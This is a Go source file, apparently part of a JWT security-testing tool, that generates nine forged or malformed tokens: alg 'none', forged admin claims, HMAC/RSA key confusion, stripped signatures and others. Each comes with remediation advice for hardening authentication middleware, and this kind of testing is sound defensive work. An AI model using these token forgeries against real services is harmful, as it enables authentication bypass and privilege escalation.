package fuzzer

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"strings"
	"time"

	"github.com/alexandrmotologa/authlens/internal/keys"
	"github.com/alexandrmotologa/authlens/internal/persona"
	jwtgo "github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"
)

// AttackVector represents a categorized security test scenario.
type AttackVector struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Category    string `json:"category"`
	Severity    string `json:"severity"` // "Critical", "High", "Medium"
	Description string `json:"description"`
	Remediation string `json:"remediation"`
	Token       string `json:"token"`
}

// AttackGenerator generates adversarial tokens to probe backend middleware resilience.
type AttackGenerator struct {
	km      *keys.KeyManager
	baseURL string
}

// NewAttackGenerator creates a security vector generator.
func NewAttackGenerator(km *keys.KeyManager, baseURL string) *AttackGenerator {
	return &AttackGenerator{
		km:      km,
		baseURL: baseURL,
	}
}

// GenerateAll produces the complete suite of 9 token tampering vectors.
func (ag *AttackGenerator) GenerateAll(basePersona *persona.Persona) ([]AttackVector, error) {
	if basePersona == nil {
		basePersona = &persona.Persona{
			Sub:   "usr_test_victim_999",
			Name:  "Test Persona",
			Email: "test@local.test",
			Roles: []string{"user"},
		}
	}

	vectors := make([]AttackVector, 0, 9)

	// 1. alg: none
	algNoneToken, err := ag.generateAlgNone(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "alg_none",
			Name:        "Algorithm Confusion (alg: none)",
			Category:    "Signature Bypass",
			Severity:    "Critical",
			Description: "Header sets alg to 'none' and signature bytes are removed. Tests if middleware allows unsigned tokens.",
			Remediation: "Explicitly reject tokens with alg 'none'. Enforce expected asymmetric signing algorithm in JWT parser.",
			Token:       algNoneToken,
		})
	}

	// 2. Signature Tampering (Altered Payload)
	tamperedSigToken, err := ag.generateTamperedPayload(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "sig_tampering",
			Name:        "Signature Tampering (Claim Escalation)",
			Category:    "Cryptographic Integrity",
			Severity:    "Critical",
			Description: "Payload claims escalated to role 'admin' while retaining valid signature for lower-privileged payload.",
			Remediation: "Verify cryptographic signature across entire header.payload segment before trusting claims.",
			Token:       tamperedSigToken,
		})
	}

	// 3. Key Confusion (HMAC vs RSA)
	keyConfusionToken, err := ag.generateKeyConfusion(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "key_confusion",
			Name:        "Key Confusion Attack (HMAC with RSA Public Key)",
			Category:    "Cryptographic Confusion",
			Severity:    "Critical",
			Description: "Token signed with HMAC-SHA256 using server public RSA key PEM as the shared secret.",
			Remediation: "Strictly enforce expected algorithm (e.g. RS256) and reject HMAC algorithms when verifying with asymmetric keys.",
			Token:       keyConfusionToken,
		})
	}

	// 4. Expired Token
	expiredToken, err := ag.generateExpired(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "token_expired",
			Name:        "Expired Token (Past Timestamp)",
			Category:    "Temporal Validation",
			Severity:    "High",
			Description: "Validly signed token with exp claim set to 2 hours in the past.",
			Remediation: "Ensure exp claim verification is active and clock skew tolerance is capped under 60 seconds.",
			Token:       expiredToken,
		})
	}

	// 5. Premature Token (Future NBF)
	futureNbfToken, err := ag.generateFutureNBF(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "future_nbf",
			Name:        "Premature Token (Future Not-Before nbf)",
			Category:    "Temporal Validation",
			Severity:    "Medium",
			Description: "Validly signed token with nbf (not before) claim set 2 hours into the future.",
			Remediation: "Validate nbf timestamp against current system time.",
			Token:       futureNbfToken,
		})
	}

	// 6. Mismatched Issuer (Untrusted IdP)
	wrongIssToken, err := ag.generateWrongIssuer(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "wrong_issuer",
			Name:        "Mismatched Issuer (Untrusted Provider)",
			Category:    "Identity Isolation",
			Severity:    "High",
			Description: "Validly signed token where iss claim points to an untrusted external identity provider.",
			Remediation: "Strictly match iss claim against expected trusted provider URL.",
			Token:       wrongIssToken,
		})
	}

	// 7. Mismatched Audience
	wrongAudToken, err := ag.generateWrongAudience(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "wrong_audience",
			Name:        "Mismatched Audience (Cross-Service Replay)",
			Category:    "Audience Isolation",
			Severity:    "High",
			Description: "Validly signed token with aud claim intended for a completely different service.",
			Remediation: "Assert aud claim matches backend resource server identifier.",
			Token:       wrongAudToken,
		})
	}

	// 8. Unknown Key ID (KID)
	unknownKidToken, err := ag.generateUnknownKID(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "unknown_kid",
			Name:        "Unknown Key ID (JWKS Miss)",
			Category:    "Key Management",
			Severity:    "Medium",
			Description: "Token signed with unknown kid that does not exist in the JWKS repository.",
			Remediation: "Safely reject tokens when kid is absent from JWKS; avoid uncontrolled JWKS re-fetch loops.",
			Token:       unknownKidToken,
		})
	}

	// 9. Stripped Signature (Blank bytes)
	strippedSigToken, err := ag.generateStrippedSignature(basePersona)
	if err == nil {
		vectors = append(vectors, AttackVector{
			ID:          "stripped_signature",
			Name:        "Stripped Signature (header.payload.)",
			Category:    "Format Validation",
			Severity:    "High",
			Description: "Standard token structure with empty signature string.",
			Remediation: "Reject tokens with missing or zero-length signature segment.",
			Token:       strippedSigToken,
		})
	}

	return vectors, nil
}

func (ag *AttackGenerator) generateAlgNone(p *persona.Persona) (string, error) {
	header := map[string]any{"alg": "none", "typ": "JWT"}
	payload := map[string]any{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"name":  p.Name,
		"email": p.Email,
		"roles": []string{"admin", "root"},
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
	}

	hBytes, _ := json.Marshal(header)
	pBytes, _ := json.Marshal(payload)

	return fmt.Sprintf("%s.%s.",
		base64.RawURLEncoding.EncodeToString(hBytes),
		base64.RawURLEncoding.EncodeToString(pBytes),
	), nil
}

func (ag *AttackGenerator) generateTamperedPayload(p *persona.Persona) (string, error) {
	// First generate legitimately signed token for basic member
	claims := jwtgo.MapClaims{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"roles": []string{"guest"},
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodRS256, claims)
	token.Header["kid"] = ag.km.ActiveRSA.ID
	signedStr, err := token.SignedString(ag.km.ActiveRSA.RSAPriv)
	if err != nil {
		return "", err
	}

	parts := strings.Split(signedStr, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("unexpected token format")
	}

	// Forge elevated claims payload without re-signing
	tamperedClaims := map[string]any{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"roles": []string{"admin", "billing_superadmin"},
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
	}
	tBytes, _ := json.Marshal(tamperedClaims)
	newPayloadB64 := base64.RawURLEncoding.EncodeToString(tBytes)

	// Combine original header + forged payload + original signature
	return fmt.Sprintf("%s.%s.%s", parts[0], newPayloadB64, parts[2]), nil
}

func (ag *AttackGenerator) generateKeyConfusion(p *persona.Persona) (string, error) {
	// Export active RSA Public Key as PEM string
	der, err := x509.MarshalPKIXPublicKey(ag.km.ActiveRSA.RSAPub)
	if err != nil {
		return "", err
	}
	pubPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: der,
	})

	// Sign HMAC-SHA256 using the Public Key PEM bytes as secret!
	claims := jwtgo.MapClaims{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"name":  p.Name,
		"roles": []string{"admin"},
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodHS256, claims)
	token.Header["kid"] = ag.km.ActiveRSA.ID // Pretend it's the RSA key!

	return token.SignedString(pubPEM)
}

func (ag *AttackGenerator) generateExpired(p *persona.Persona) (string, error) {
	now := time.Now().UTC()
	claims := jwtgo.MapClaims{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"exp":   now.Add(-2 * time.Hour).Unix(), // 2 hours in the past
		"iat":   now.Add(-4 * time.Hour).Unix(),
		"roles": p.Roles,
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodRS256, claims)
	token.Header["kid"] = ag.km.ActiveRSA.ID
	return token.SignedString(ag.km.ActiveRSA.RSAPriv)
}

func (ag *AttackGenerator) generateFutureNBF(p *persona.Persona) (string, error) {
	now := time.Now().UTC()
	claims := jwtgo.MapClaims{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"exp":   now.Add(4 * time.Hour).Unix(),
		"nbf":   now.Add(2 * time.Hour).Unix(), // not valid for 2 hours
		"iat":   now.Unix(),
		"roles": p.Roles,
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodRS256, claims)
	token.Header["kid"] = ag.km.ActiveRSA.ID
	return token.SignedString(ag.km.ActiveRSA.RSAPriv)
}

func (ag *AttackGenerator) generateWrongIssuer(p *persona.Persona) (string, error) {
	claims := jwtgo.MapClaims{
		"iss":   "https://malicious-idp.darknet.example.com/oauth",
		"sub":   p.Sub,
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
		"roles": []string{"admin"},
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodRS256, claims)
	token.Header["kid"] = ag.km.ActiveRSA.ID
	return token.SignedString(ag.km.ActiveRSA.RSAPriv)
}

func (ag *AttackGenerator) generateWrongAudience(p *persona.Persona) (string, error) {
	claims := jwtgo.MapClaims{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"aud":   "https://other-unrelated-api.internal.corp",
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
		"roles": p.Roles,
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodRS256, claims)
	token.Header["kid"] = ag.km.ActiveRSA.ID
	return token.SignedString(ag.km.ActiveRSA.RSAPriv)
}

func (ag *AttackGenerator) generateUnknownKID(p *persona.Persona) (string, error) {
	// Generate an external throwaway RSA key
	throwawayPriv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", err
	}

	claims := jwtgo.MapClaims{
		"iss":   ag.baseURL,
		"sub":   p.Sub,
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
		"roles": p.Roles,
	}
	token := jwtgo.NewWithClaims(jwtgo.SigningMethodRS256, claims)
	token.Header["kid"] = "unknown-orphaned-kid-" + uuid.New().String()[:8]
	return token.SignedString(throwawayPriv)
}

func (ag *AttackGenerator) generateStrippedSignature(p *persona.Persona) (string, error) {
	signed, err := ag.generateExpired(p)
	if err != nil {
		return "", err
	}
	parts := strings.Split(signed, ".")
	if len(parts) >= 2 {
		return fmt.Sprintf("%s.%s.", parts[0], parts[1]), nil
	}
	return signed, nil
}
